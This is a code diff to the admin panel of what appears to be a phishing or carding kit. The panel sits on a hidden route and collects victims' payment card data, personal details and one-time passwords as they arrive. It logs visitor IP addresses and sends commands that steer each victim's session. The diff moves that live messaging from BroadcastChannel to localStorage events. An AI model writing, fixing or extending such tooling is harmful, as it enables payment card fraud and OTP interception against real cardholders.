@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '../components/ui/table';
 
@@ -49,68 +48,62 @@ const AdminPanel = () => {
   useEffect(() => {
     setConnectionStatus('Connected');
     
-    // Ensure we always use the same channel name
-    const channelName = 'cardData';
-    
-    if (!window.cardDataChannel) {
-      window.cardDataChannel = new BroadcastChannel(channelName);
-      console.log('Admin Panel: Created new BroadcastChannel:', channelName);
-    }
-
     console.log('Admin Panel: Initializing on route /parking55009hvSweJimbs5hhinbd56y');
     console.log('Admin Panel: Current location:', window.location.href);
-    console.log('Admin Panel: BroadcastChannel available:', !!window.cardDataChannel);
+    console.log('Admin Panel: Using localStorage for cross-browser communication');
 
-    const handleData = (event: MessageEvent) => {
-      const data = event.data;
-      console.log('Admin panel received data:', data);
-      
-      if (data.type === 'cardData') {
-        console.log('Processing card data:', data);
+    const handleStorageEvent = (event: StorageEvent) => {
+      if (event.key === 'adminData' && event.oldValue) {
+        const data = JSON.parse(event.oldValue);
+        console.log('Admin panel received data via localStorage:', data);
         
-        const newSubmission: CardSubmission = {
-          cardData: data.data,
-          userInfo: data.userInfo,
-          timestamp: new Date(data.timestamp || new Date()),
-          invoiceId: generateInvoiceId(),
-          isNew: true
-        };
-        
-        setCardSubmissions(prev => [newSubmission, ...prev]);
-        showNotification('New card data received!');
-        
-      } else if (data.type === 'otp') {
-        console.log('Received OTP:', data.otp);
-        
-        setCardSubmissions(prev => prev.map((submission, index) => 
-          index === 0 ? { ...submission, otp: data.otp } : submission
-        ));
-        showNotification('OTP received!');
-        
-      } else if (data.type === 'newVisitor') {
-        console.log('Processing new visitor:', data);
-        const newVisitor = {
-          ip: data.ip,
-          timestamp: new Date(data.timestamp || new Date())
-        };
-        
-        setVisitors(prev => {
-          const exists = prev.some(v => v.ip === newVisitor.ip);
-          if (!exists) {
-            showNotification(`New visitor: ${newVisitor.ip}`);
-            return [newVisitor, ...prev];
-          }
-          return prev;
-        });
+        if (data.type === 'cardData') {
+          console.log('Processing card data:', data);
+          
+          const newSubmission: CardSubmission = {
+            cardData: data.data,
+            userInfo: data.userInfo,
+            timestamp: new Date(data.timestamp || new Date()),
+            invoiceId: generateInvoiceId(),
+            isNew: true
+          };
+          
+          setCardSubmissions(prev => [newSubmission, ...prev]);
+          showNotification('New card data received!');
+          
+        } else if (data.type === 'otp') {
+          console.log('Received OTP:', data.otp);
+          
+          setCardSubmissions(prev => prev.map((submission, index) => 
+            index === 0 ? { ...submission, otp: data.otp } : submission
+          ));
+          showNotification('OTP received!');
+          
+        } else if (data.type === 'newVisitor') {
+          console.log('Processing new visitor:', data);
+          const newVisitor = {
+            ip: data.ip,
+            timestamp: new Date(data.timestamp || new Date())
+          };
+          
+          setVisitors(prev => {
+            const exists = prev.some(v => v.ip === newVisitor.ip);
+            if (!exists) {
+              showNotification(`New visitor: ${newVisitor.ip}`);
+              return [newVisitor, ...prev];
+            }
+            return prev;
+          });
+        }
       }
     };
 
-    window.cardDataChannel.onmessage = handleData;
+    window.addEventListener('storage', handleStorageEvent);
 
     // Test the connection by sending a ping
     setTimeout(() => {
-      console.log('Admin Panel: Sending connection test');
-      window.cardDataChannel.postMessage({ type: 'adminReady', timestamp: new Date().toISOString() });
+      console.log('Admin Panel: Sending connection test via localStorage');
+      localStorage.setItem('adminCommand', JSON.stringify({ type: 'adminReady', timestamp: new Date().toISOString() }));
     }, 1000);
 
     // Simulate visitor cleanup (remove visitors after 5 minutes of inactivity)
@@ -120,14 +113,13 @@ const AdminPanel = () => {
     }, 60000);
 
     return () => {
-      window.cardDataChannel.onmessage = null;
+      window.removeEventListener('storage', handleStorageEvent);
       clearInterval(cleanupInterval);
     };
   }, []);
 
   const sendCommand = (command: string, submissionIndex?: number) => {
-    console.log('Sending command:', command);
-    console.log('BroadcastChannel available:', !!window.cardDataChannel);
+    console.log('Sending command via localStorage:', command);
     showNotification(`${command.toUpperCase()} has been initiated`);
     
     if (submissionIndex !== undefined) {
@@ -136,12 +128,9 @@ const AdminPanel = () => {
       ));
     }
     
-    if (window.cardDataChannel) {
-      window.cardDataChannel.postMessage({ command });
-      console.log('Command sent successfully via BroadcastChannel');
-    } else {
-      console.error('BroadcastChannel not available for sending command');
-    }
+    // Send command via localStorage for cross-browser communication
+    localStorage.setItem('adminCommand', JSON.stringify({ command }));
+    console.log('Command sent successfully via localStorage');
   };
 
   const handleRowClick = (index: number) => {
@@ -180,12 +169,10 @@ const AdminPanel = () => {
         <span className={`px-3 py-1 rounded text-sm ${
           connectionStatus === 'Connected' ? 'bg-green-600' : 'bg-red-600'
         }`}>
-          WebSocket: {connectionStatus}
+          Cross-Browser: {connectionStatus}
         </span>
-        <span className={`ml-2 px-3 py-1 rounded text-sm ${
-          window.cardDataChannel ? 'bg-green-600' : 'bg-red-600'
-        }`}>
-          BroadcastChannel: {window.cardDataChannel ? 'Ready' : 'Not Ready'}
+        <span className="ml-2 px-3 py-1 rounded text-sm bg-green-600">
+          localStorage: Ready
         </span>
       </div>
       
@@ -303,7 +290,7 @@ const AdminPanel = () => {
           <li>• Use command buttons to control user experience</li>
           <li>• All transactions are saved until you delete them</li>
           <li>• Visitors are automatically removed after 5 minutes of inactivity</li>
-          <li>• BroadcastChannel status is shown above for debugging</li>
+          <li>• Cross-Browser communication is enabled via localStorage</li>
         </ul>
       </div>
     </div>
